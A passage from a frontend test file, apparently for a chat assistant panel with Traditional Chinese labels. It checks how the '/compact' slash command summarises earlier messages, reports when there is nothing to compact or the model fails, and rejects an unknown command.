        { id: 'a1', role: 'assistant', parts: [{ type: 'text', text: '第一個回答' }] },
        { id: 'u2', role: 'user', parts: [{ type: 'text', text: '第二句' }] },
        { id: 'a2', role: 'assistant', parts: [{ type: 'text', text: '第二個回答' }] },
      ],
    })
    api.command = () => {
      api.stored = [
        {
          id: 'u2',
          role: 'user',
          parts: [
            { type: 'data-compaction', data: { content: '- 使用者在問 **SPY×FAMILY**' } },
            { type: 'text', text: '第二句' },
          ],
        },
        { id: 'a2', role: 'assistant', parts: [{ type: 'text', text: '第二個回答' }] },
      ]
      return json({ command: 'compact', before: 4, after: 2, error: '' })
    }
    serve(api)
    const user = userEvent.setup()
    renderPanel()

    expect(await screen.findByText('第一句')).toBeInTheDocument()
    await user.type(screen.getByRole('textbox', { name: '問助理' }), '/compact{Enter}')

    expect(await screen.findByText(/已壓縮：4 則訊息/)).toBeInTheDocument()
    const log = within(screen.getByRole('log'))
    expect(log.queryByText('第一句')).toBeNull()
    expect(log.getByText('第二句')).toBeInTheDocument()
    const summary = log.getByText('較早的對話已壓縮成這段摘要').closest('details')!
    expect(summary).not.toHaveAttribute('open')
    expect(within(summary).getByText('SPY×FAMILY')).toBeInTheDocument()
  })

  it('says when there was nothing to compact, or the summary failed', async () => {
    let answer = { command: 'compact', before: 2, after: null, error: '' }
    serve(backend({ command: () => json(answer) }))
    const user = userEvent.setup()
    renderPanel()

    const input = await screen.findByRole('textbox', { name: '問助理' })
    await user.type(input, '/compact{Enter}')
    expect(await screen.findByText('只有一輪，沒什麼好壓縮。')).toBeInTheDocument()

    answer = { ...answer, error: 'ModelHTTPError: 529' }
    await user.type(input, '/compact{Enter}')
    expect(await screen.findByText('ModelHTTPError: 529')).toBeInTheDocument()
    expect(screen.getByText(/壓縮沒成功，對話照舊/)).toBeInTheDocument()
  })

  it('puts an unknown command back in the box and says what is wrong', async () => {
    serve(
      backend({
        command: () => json({ detail: { reason: 'unknown_command', detail: '/compactt' } }, 422),
      }),
    )
    const user = userEvent.setup()
    renderPanel()

    const input = await screen.findByRole('textbox', { name: '問助理' })
    await user.type(input, '/compactt{Enter}')

    expect(await screen.findByText(/沒有「\/compactt」這個指令/)).toBeInTheDocument()
    expect(input).toHaveValue('/compactt')
    expect(sent).toHaveLength(0)
  })
})
